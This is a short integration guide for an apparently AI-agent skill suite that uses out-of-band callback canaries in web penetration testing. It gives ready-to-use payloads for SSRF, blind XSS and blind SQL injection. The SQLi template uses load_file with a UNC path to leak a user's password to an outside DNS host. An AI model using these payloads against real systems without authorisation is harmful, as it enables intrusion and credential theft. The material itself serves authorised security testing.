# Integration Guide for Other Skills

## Using OOB in Your Skill Workflows

Any skill can use OOB callbacks by calling the integration helper:

### 1. SSRF Testing (api skill)
```bash
# Get a canary URL
CANARY=$(python3 .claude/skills/oob-infra/scripts/oob_integration.py inject \
  --template '{{CANARY}}' --purpose ssrf --test-id api-ssrf-001 | jq -r .canary_url)

# Use it in a test
curl -s "https://target.com/api/fetch?url=http://${CANARY}"

# Poll for callbacks
python3 .claude/skills/oob-infra/scripts/oob_integration.py poll --wait 30
```

### 2. Blind XSS (xss skill)
```bash
CANARY=$(python3 .claude/skills/oob-infra/scripts/oob_integration.py inject \
  --template '<img src=//{{CANARY}}>' --purpose blind-xss --test-id xss-001 | jq -r .canary_url)
```

### 3. Blind SQLi (sqli skill)
```bash
CANARY=$(python3 .claude/skills/oob-infra/scripts/oob_integration.py inject \
  --template "' UNION SELECT load_file(concat('\\\\',(SELECT password FROM users LIMIT 1),'.{{CANARY}}\\\foofile'))--" \
  --purpose blind-sqli --test-id sqli-001 | jq -r .canary_url)
```

## Template Placeholders
- `{{CANARY}}` — Raw canary domain (`abc123.oast.pro`)
- `{{CANARY_HTTP}}` — `http://abc123.oast.pro`
- `{{CANARY_HTTPS}}` — `https://abc123.oast.pro`
- `{{CANARY_DNS}}` — Same as `{{CANARY}}` (for DNS exfiltration)

## Best Practices
- Always run `auto-setup` before testing
- Always run `auto-cleanup` after testing
- Use descriptive `purpose` and `test-id` for correlation
- Poll for at least 30-60 seconds for network latency
